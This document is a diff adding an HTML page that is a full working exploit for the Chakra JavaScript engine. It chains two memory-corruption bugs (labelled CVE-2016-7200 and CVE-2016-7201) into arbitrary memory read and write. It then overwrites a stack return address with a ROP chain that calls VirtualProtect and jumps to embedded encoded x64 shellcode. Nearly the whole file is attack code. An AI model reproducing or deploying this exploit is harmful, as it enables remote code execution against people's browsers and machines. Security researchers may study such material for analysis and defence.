@@ -1,0 +1,185 @@
+<html>
+    <head>
+        <script src="long.min.js"></script>
+    </head>
+    <body>
+        <script>
+            var Long = dcodeIO.Long;
+
+            var dv;
+            var fdv = new DataView(new ArrayBuffer(8));
+            var x = (new Array(56, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)).slice();
+            var [hi, lo] = PutDataAndGetAddr(x);
+            [hi, lo] = [hi|0, (lo + 0x58)|0];                           // offset (0x58) to the array data slots
+            TriggerFillFromPrototypesBug(lo, hi);
+
+            var vtable = Read64(new Long(lo - 0x58, hi, true));
+            var chakraBase = Read64(vtable).sub(0x274C40);
+            //alert("chakraBase: 0x" + chakraBase.toString(16));
+            var threadCtxPtr = Read64(chakraBase.add(0x735EA8));
+            //alert("threadCtxPtr: 0x" + threadCtxPtr.toString(16));
+
+            var stackLimit = Read64(threadCtxPtr.add(0x388));
+            var stack = stackLimit.sub(0xC000).add(10*1024*1024);       // 10 MB thread stack
+            var retPtr = chakraBase.add(0x162A1D);                      // Inside ScriptEngine::ExecutePendingScripts (after a call to Execute)
+            var retPtrAddr;
+            for (var i = 8; i < 32 * 1024; i += 8)
+            {
+                var val = Read64(stack.sub(i));
+                if (val.equals(retPtr))
+                {
+                    retPtrAddr = stack.sub(i);
+                    break;
+                }
+            }
+            //alert("retPtrAddr: 0x" + retPtrAddr.toString(16));
+
+            var sc = unescape("%u8148%u78ec%u0001%u4c00%u848d%u6824%u0001%u4800%u158d%u05e5%u0000%u8d48%ub50d%u0005%ue800%u041a%u0000%u8b4c%u248c%u0168%u0000%u8d4c%u2484%u0170%u0000%u8d48%ub315%u0005%u4800%u0d8d%u0592%u0000%uf7e8%u0003%u4800%u0d8d%u0586%u0000%u94ff%u6824%u0001%u4800%uc189%u8d48%uab15%u0005%uff00%u2494%u0170%u0000%u8948%u2484%u0108%u0000%u8d48%u5f0d%u0005%uff00%u2494%u0168%u0000%u8948%u48c1%u158d%u055b%u0000%u94ff%u7024%u0001%u4800%u8489%u1024%u0001%u4800%u0d8d%u0574%u0000%u94ff%u6824%u0001%u4800%uc189%u8d48%u6e15%u0005%uff00%u2494%u0170%u0000%u8948%u2484%u0118%u0000%u8d48%u4d0d%u0005%uff00%u2494%u0168%u0000%u8948%u48c1%u158d%u055a%u0000%u94ff%u7024%u0001%u4800%u8489%u2024%u0001%u4800%u0d8d%u0526%u0000%u94ff%u6824%u0001%u4800%uc189%u8d48%u4315%u0005%uff00%u2494%u0170%u0000%u8948%u2484%u0128%u0000%u8d48%uff0d%u0004%uff00%u2494%u0168%u0000%u8948%u48c1%u158d%u0529%u0000%u94ff%u7024%u0001%u4800%u8489%u3024%u0001%u4800%u0d8d%u04d8%u0000%u94ff%u6824%u0001%u4800%uc189%u8d48%u0d15%u0005%uff00%u2494%u0170%u0000%u8948%u2484%u0138%u0000%u8d48%ub10d%u0004%uff00%u2494%u0168%u0000%u8948%u48c1%u158d%u04f8%u0000%u94ff%u7024%u0001%u4800%u8489%u4024%u0001%u4800%u0d8d%u048a%u0000%u94ff%u6824%u0001%u4800%uc189%u8d48%udd15%u0004%uff00%u2494%u0170%u0000%u8948%u2484%u0148%u0000%u8d48%u630d%u0004%uff00%u2494%u0168%u0000%u8948%u48c1%u158d%u04c7%u0000%u94ff%u7024%u0001%u4800%u8489%u5024%u0001%u4800%u0d8d%u043c%u0000%u94ff%u6824%u0001%u4800%uc189%u8d48%ub115%u0004%uff00%u2494%u0170%u0000%u8948%u2484%u0158%u0000%u8d48%u150d%u0004%uff00%u2494%u0168%u0000%u8948%u48c1%u158d%u0494%u0000%u94ff%u7024%u0001%u4800%u8489%u6024%u0001%uff00%u2494%u0160%u0000%uc748%u2444%u0058%u0000%u4800%u44c7%u5024%u0000%u0000%uc748%u2444%u0048%u0000%u4800%u4489%u4024%uc748%u2444%ue038%u0001%u4800%u44c7%u3024%u0280%u0000%uc748%u2444%u0028%u0000%u4800%u44c7%u2024%u0000%u0000%ub941%u0000%u40cf%u8d4c%u4505%u0004%u4800%u158d%u0437%u0000%u00b9%u0002%uff00%u2494%u0120%u0000%u8948%u48c3%ud989%u94ff%u2824%u0001%uba00%u0001%u0000%u8948%uffd9%u2494%u0130%u0000%ub841%u4141%u4141%uc748%uf4c2%uffff%u48ff%ud989%u94ff%u3824%u0001%uba00%u0001%u0000%u8948%uffd9%u2494%u0118%u0000%u64b9%u0000%uff00%u2494%u0108%u0000%u94ff%u6024%u0001%uba00%u0001%u0000%u8948%uffc1%u2494%u0118%u0000%uc748%u2444%u0028%u0000%u4800%u44c7%u2024%u0000%u0000%u8949%u4ce1%u058d%u0050%u0000%u00ba%u0000%ub900%u0000%u0000%u94ff%u1024%u0001%u4100%u00b9%u0000%u4100%u00b8%u0000%uba00%u0000%u0000%u8d48%u244c%uff60%u2494%u0140%u0000%u8d48%u244c%uff60%u2494%u0148%u0000%u8d48%u244c%uff60%u2494%u0150%u0000%uc9eb%u8148%u78c4%u0001%uc300%u8348%u50ec%u5657%u8948%ub9cf%u01f4%u0000%u97ff%u0108%u0000%u44c7%u2024%u0001%u0000%uc766%u2444%u002a%uc700%u2444%u0030%u0000%u4800%u44c7%u3824%u0000%u0000%uc766%u2444%u1228%uc700%u2444%u002c%u0000%u4100%u28b8%u0000%u4800%u548d%u2024%u01b9%u0000%uff00%u5897%u0001%ube00%u0014%u0000%uc766%u2444%u1b28%uc700%u2444%u002c%u0000%u4100%u28b8%u0000%u4800%u548d%u2024%u01b9%u0000%uff00%u5897%u0001%u6600%u44c7%u2824%u001b%u44c7%u2c24%u0002%u0000%ub841%u0028%u0000%u8d48%u2454%ub920%u0001%u0000%u97ff%u0158%u0000%u64b9%u0000%uff00%u0897%u0001%u4800%uee83%u7501%u66a5%u44c7%u2824%u0012%u44c7%u2c24%u0002%u0000%ub841%u0028%u0000%u8d48%u2454%ub920%u0001%u0000%u97ff%u0158%u0000%u3148%u5ec0%u485f%uc483%uc330%u8148%u48ec%u0002%u4800%u9c89%u0824%u0001%u4800%uac89%u1024%u0001%u4800%ubc89%u1824%u0001%u4800%ub489%u2024%u0001%u4c00%ua489%u2824%u0001%u4c00%uac89%u3024%u0001%u4c00%ub489%u3824%u0001%u4c00%ubc89%u4024%u0001%u6500%u8b4c%u251c%u0060%u0000%u8b4d%u185b%u8d4d%u105b%u894d%u4ddf%u1b8b%u49fc%u7b8b%u4860%uce89%u84ac%u74c0%u8a26%u8027%u61fc%u037c%uec80%u3820%u75c4%u4808%uc7ff%uff48%uebc7%u4de5%u1b8b%u394d%u75fb%u48d6%uc031%ubae9%u0000%u4900%u5b8b%u4430%u638b%u493c%udc01%u8149%u88c4%u0000%u4500%u2c8b%u4d24%ued85%u0875%u3148%ue9c0%u0097%u0000%u8d4e%u2b1c%u8b45%u2474%u4d04%uee01%u8b41%u184b%u8b45%u2053%u0149%uffda%u4dc9%u248d%u418a%u3c8b%u4824%udf01%u8948%ua6d6%u0875%u068a%uc084%u0974%uf5eb%ue5e2%u3148%uebc0%u455e%u638b%u4924%udc01%u4166%u0c8b%u454c%u638b%u491c%udc01%u8b41%u8c04%u394c%u7ce8%u4c3f%uf039%u3a73%u8d48%u1834%u8d48%u24bc%u0148%u0000%u80a4%u2e3e%ufa75%uc7a4%u4407%u4c4c%u4d00%uc689%u8d48%u248c%u0148%u0000%uff41%u4dd1%uf089%u8d48%u248c%u0148%u0000%u8948%ue9f2%ufeff%uffff%u0148%u49d8%u0089%u8b48%u249c%u0108%u0000%u8b48%u24ac%u0110%u0000%u8b48%u24bc%u0118%u0000%u8b48%u24b4%u0120%u0000%u8b4c%u24a4%u0128%u0000%u8b4c%u24ac%u0130%u0000%u8b4c%u24b4%u0138%u0000%u8b4c%u24bc%u0140%u0000%u8148%u48c4%u0002%uc300%u454b%u4e52%u4c45%u3233%u442e%u4c4c%u4300%u6572%u7461%u5465%u7268%u6165%u0064%u6547%u5074%u6f72%u4163%u6464%u6572%u7373%u4c00%u616f%u4c64%u6269%u6172%u7972%u0041%u6c53%u6565%u0070%u5355%u5245%u3233%u442e%u4c4c%u5300%u6977%u6374%u5468%u546f%u6968%u5773%u6e69%u6f64%u0077%u7243%u6165%u6574%u6957%u646e%u776f%u7845%u0041%u7055%u6164%u6574%u6957%u646e%u776f%u5300%u6f68%u5777%u6e69%u6f64%u0077%u6553%u5774%u6e69%u6f64%u4c77%u6e6f%u5067%u7274%u0057%u6547%u4d74%u7365%u6173%u6567%u0057%u7254%u6e61%u6c73%u7461%u4d65%u7365%u6173%u6567%u4400%u7369%u6170%u6374%u4d68%u7365%u6173%u6567%u0057%u6553%u646e%u6e49%u7570%u0074%u6547%u4474%u7365%u746b%u706f%u6957%u646e%u776f%u7300%u6174%u6974%u0063%u6554%u7473%u4100");
+            var [shi, slo] = PutDataAndGetAddr(sc);
+            var shcodeAddr = Read64((new Long(slo|0, shi|0, true).add(0x20)));          // offset (0x20) to the pointer to the buffer
+            alert("shcodeAddr: 0x" + shcodeAddr.toString(16));
+
+            var filler = new Long(0, 0, true);
+            var rop = [
+                /*
+                    chakraBase + 0x1DA2F5           // pop rdi; pop rsi; pop rbx; retn
+                    shcodeAddr & 0xFF..FFF000       // lpAddress
+                    0x1000                          // dwSize
+                    0x40                            // flNewProtect
+                    chakraBase + 0x1DA2CB           // setup args => call VirtualProtect
+                    ...                             // 0x30 garbage (6 * uint64)
+                    0                               // In order to pass check
+                    ...                             // 0x98 - 0x38 garbage (12 * uint64)
+                    shcodeAddr                      // Finally return to our shellcode!
+                */
+                chakraBase.add(0x1DA2F5),
+                shcodeAddr.and(new Long(0xFFFFF000, 0xFFFFFFFF, true)),
+                new Long(0x1000, 0, true),
+                new Long(0x40, 0, true),
+                chakraBase.add(0x1DA2CB),
+                filler, filler, filler, filler, filler, filler,
+                new Long(0, 0, true),
+                filler, filler, filler, filler, filler, filler,
+                filler, filler, filler, filler, filler, filler,
+                shcodeAddr
+            ];
+
+            for (var i = 0; i < rop.length; ++i)
+            {
+                Write64(retPtrAddr.add(i * 8), rop[i]);
+            }
+
+            alert("Boom!");
+
+            //encodeURI("1337");
+
+
+            /* Using FillFromPrototypes bug (CVE-2016-7201) */
+            function TriggerFillFromPrototypesBug(lo, hi)
+            {
+                // Type* (which has TypeId)
+                x[2] = lo;
+                x[3] = hi;
+
+                // +0x3C points to 0 (index 1) for bypassing isDetached check
+                x[10] = (lo - 0x38)|0;
+                x[11] = hi;
+
+                // buffer length
+                x[8] = 0x200;
+
+                // buffer addr
+                x[14] = (lo - 0x58)|0;
+                x[15] = hi;
+
+                var a = new Array(0x11111111, 0, 0x22222222, 0, 0x33333333, 0, lo, hi, 0x55555555, 0);
+
+                var handler = {
+                    getPrototypeOf: function(target, name) {
+                        return a;
+                    }
+                };
+
+                var p = new Proxy([], handler);
+                var b = [{}, [], "abc"];
+
+                b.__proto__ = p;
+                b.length = 4;
+
+                a.shift.call(b);
+                dv = b[2];
+            }
+
+            /* Using Array.filter InfoLeak bug (CVE-2016-7200) */
+            function PutDataAndGetAddr(t)
+            {
+                var d = new Array(1,2,3);
+                class dummy {
+                    constructor() {
+                        return d;
+                    }
+                }
+
+                class MyArray extends Array {
+                    static get [Symbol.species]() {
+                        return dummy;
+                    }
+                }
+
+
+                var a = new Array({}, t, "theori", 7, 7, 7, 7, 7);
+
+                function test(i) {
+                    return true;
+                }
+
+
+                a.__proto__ = MyArray.prototype;
+
+                var o = a.filter(test);
+                var h = [];
+
+                for (item in o) {
+                    var n = new Number(o[item]);
+                    if (n < 0) {
+                        n = n + 0x100000000;
+                    }
+                    h.push(n);
+                }
+                return [h[3], h[2]];
+            }
+
+            /* Utility */
+            function SetAddress(addr)
+            {
+                x[14] = addr.low|0;
+                x[15] = addr.high|0;
+            }
+
+            function Read32(addr)
+            {
+                SetAddress(addr);
+                return new Long(fdv.getUint32.call(dv, 0, true), 0, true);
+            }
+
+            function Read64(addr)
+            {
+                SetAddress(addr);
+                return new Long(fdv.getUint32.call(dv, 0, true), fdv.getUint32.call(dv, 4, true), true);
+            }
+
+            function Write32(addr, val)
+            {
+                SetAddress(addr);
+                fdv.setUint32.call(dv, 0, val.low|0, true);
+            }
+
+            function Write64(addr, val)
+            {
+                SetAddress(addr);
+                fdv.setUint32.call(dv, 0, val.low|0, true);
+                fdv.setUint32.call(dv, 4, val.high|0, true);
+            }
+        </script>
+    </body>
+</html>
